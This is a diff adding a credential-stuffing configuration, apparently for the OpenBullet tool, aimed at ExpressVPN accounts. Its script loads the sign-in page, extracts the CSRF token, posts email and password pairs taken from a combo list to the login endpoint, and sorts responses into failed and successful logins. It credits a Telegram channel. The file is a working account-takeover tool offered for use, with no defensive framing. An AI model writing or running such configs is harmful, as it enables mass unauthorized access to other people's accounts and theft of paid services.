@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "express vpn",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-19T14:07:40.9468878+01:00",
+  "AdditionalInfo": "",
+  "Author": "THX",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.expressvpn.com/sign-in" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<HEADERS(X-Request-Id)>" LR "" "" -> VAR "REQUEST-ID" 
+
+PARSE "<SOURCE>" LR "name=\"authenticity_token\" value=\"" "\" />" -> VAR "TOKEN" 
+
+REQUEST POST "https://www.expressvpn.com/sessions" EncodeContent=TRUE 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<TOKEN>&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "origin: https://www.expressvpn.com" 
+  HEADER "referer: https://www.expressvpn.com/sign-in" 
+  HEADER "x-request-id: <REQUEST-ID>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password." 
+  KEYCHAIN Success OR 
+    KEY "https://www.expressvpn.com/verify" 
+    KEY "Verification Needed" 
+
+#About FUNCTION Constant "t.me/TeamDemon" -> CAP "Channel"
+
